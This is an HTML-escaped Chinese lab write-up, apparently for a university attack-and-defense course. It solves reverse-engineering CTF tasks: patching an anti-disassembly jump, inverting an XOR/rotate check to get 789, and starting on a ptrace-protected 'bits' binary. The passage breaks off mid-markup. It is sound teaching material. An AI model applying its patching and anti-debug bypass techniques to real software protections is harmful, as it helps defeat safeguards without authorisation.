&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x5555555551fd&lt;/span&gt; &amp;lt;encrypt+&lt;span class=&#34;number&#34;&gt;84&lt;/span&gt;&amp;gt;    cmp    dword ptr [rbp - &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x555555555201&lt;/span&gt; &amp;lt;encrypt+&lt;span class=&#34;number&#34;&gt;88&lt;/span&gt;&amp;gt;    jle    encrypt+&lt;span class=&#34;number&#34;&gt;66&lt;/span&gt;                &amp;lt;encrypt+&lt;span class=&#34;number&#34;&gt;66&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   ↓&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x5555555551eb&lt;/span&gt; &amp;lt;encrypt+&lt;span class=&#34;number&#34;&gt;66&lt;/span&gt;&amp;gt;    jmp    encrypt+&lt;span class=&#34;number&#34;&gt;67&lt;/span&gt;                &amp;lt;encrypt+&lt;span class=&#34;number&#34;&gt;67&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   ↓&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;► &lt;span class=&#34;number&#34;&gt;0x5555555551ec&lt;/span&gt; &amp;lt;encrypt+&lt;span class=&#34;number&#34;&gt;67&lt;/span&gt;&amp;gt;    inc    eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x5555555551ee&lt;/span&gt; &amp;lt;encrypt+&lt;span class=&#34;number&#34;&gt;69&lt;/span&gt;&amp;gt;    dec    eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x5555555551f0&lt;/span&gt; &amp;lt;encrypt+&lt;span class=&#34;number&#34;&gt;71&lt;/span&gt;&amp;gt;    mov    eax, dword ptr [rbp - &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x5555555551f3&lt;/span&gt; &amp;lt;encrypt+&lt;span class=&#34;number&#34;&gt;74&lt;/span&gt;&amp;gt;    xor    dword ptr [rbp - &lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;], eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x5555555551f6&lt;/span&gt; &amp;lt;encrypt+&lt;span class=&#34;number&#34;&gt;77&lt;/span&gt;&amp;gt;    rol    dword ptr [rbp - &lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x5555555551f9&lt;/span&gt; &amp;lt;encrypt+&lt;span class=&#34;number&#34;&gt;80&lt;/span&gt;&amp;gt;    add    dword ptr [rbp - &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		所以要想解决的话,有多个办法,一个是,jmp 到0000011ED就可以了,将FF改成00,也就再往前走一步,这样就可以了,第二个办法是都改成nop就可以了,让指令往下滑.&lt;/p&gt;
&lt;p&gt;​		反编译结果&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;encrypt&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// bh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = a1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( a1 &amp;gt; &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt;= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v1 &amp;gt;&amp;gt;= &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v2 = __ROL4__(v2 ^ &lt;span class=&#34;number&#34;&gt;0x1453&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		a1是输入的值,首先a1不能大于4096, 然后v1右移7位,v2 等于 v2和0x1453异或后 左移1位,( rol    dword ptr [rbp - 0x14], 1)&lt;/p&gt;
&lt;p&gt;​		最后的结果是50138,逆向推导,右移一位,异或0x1453,这个操作做三次,就得到了答案789&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; input = &lt;span class=&#34;number&#34;&gt;50138&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  input &amp;gt;&amp;gt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  input = input ^ &lt;span class=&#34;number&#34;&gt;0x1453&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  input &amp;gt;&amp;gt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  input = input ^ &lt;span class=&#34;number&#34;&gt;0x1453&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  input &amp;gt;&amp;gt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  input = input ^ &lt;span class=&#34;number&#34;&gt;0x1453&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,input);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;运行截图&#34;&gt;&lt;a href=&#34;#运行截图&#34; class=&#34;headerlink&#34; title=&#34;运行截图&#34;&gt;&lt;/a&gt;运行截图&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/image-20230310200841386.png&#34; alt=&#34;image-20230310200841386&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;re1-asm&#34;&gt;&lt;a href=&#34;#re1-asm&#34; class=&#34;headerlink&#34; title=&#34;re1 asm&#34;&gt;&lt;/a&gt;re1 asm&lt;/h1&gt;&lt;p&gt;​		得到一个asm.s文件,汇编文件,查看可以知道是由test.c汇编而来,可以选择硬读汇编来解,也可以进行编译成二进制文件后,再反汇编反编译成伪代码进行查看.&lt;/p&gt;
&lt;p&gt;​		gcc asm.s 得到二进制文件 a.out,然后拖进ida进行反编译,得到结果&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( a == &lt;span class=&#34;number&#34;&gt;29488&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;you win&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;you lose&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;re2-bits&#34;&gt;&lt;a href=&#34;#re2-bits&#34; class=&#34;headerlink&#34; title=&#34;re2 bits&#34;&gt;&lt;/a&gt;re2 bits&lt;/h1&gt;&lt;h2 id=&#34;概要&#34;&gt;&lt;a href=&#34;#概要&#34; class=&#34;headerlink&#34; title=&#34;概要&#34;&gt;&lt;/a&gt;概要&lt;/h2&gt;&lt;p&gt;​		这是一道ctf的逆向题目,给了二进制文件和远程服务器连接方式.二进制文件是elf 64位,通过给程序一个正确的输入,当验证输入正确的时候,会从flag文件中读取flag.flag文件在远程服务器上,所以在本地调试好后要和服务器进行交互拿到flag.&lt;/p&gt;
&lt;p&gt;​		先对程序进行了逆向分析,对算法进行逆向编写,编写过程比较困难,最后失败.采取爆破的方法,利用angr工具求解.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/image-20230310200230541.png&#34; alt=&#34;image-20230310200230541&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;程序分析&#34;&gt;&lt;a href=&#34;#程序分析&#34; class=&#34;headerlink&#34; title=&#34;程序分析&#34;&gt;&lt;/a&gt;程序分析&lt;/h2&gt;&lt;h3 id=&#34;程序伪代码&#34;&gt;&lt;a href=&#34;#程序伪代码&#34; class=&#34;headerlink&#34; title=&#34;程序伪代码&#34;&gt;&lt;/a&gt;程序伪代码&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; __fastcall __noreturn &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a1, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a2, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;__pid_t&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;__pid_t&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// ebx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v5; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v6; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-40h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v7; &lt;span class=&#34;comment&#34;&gt;// [rsp+4h] [rbp-3Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-38h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size_4; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-34h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *ptr; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-30h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *s; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-28h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  FILE *stream; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-20h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v13; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v13 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( ptrace(PTRACE_TRACEME, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;) &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Do not trace me!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = getpid();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = getsid(v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 != getppid() )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span 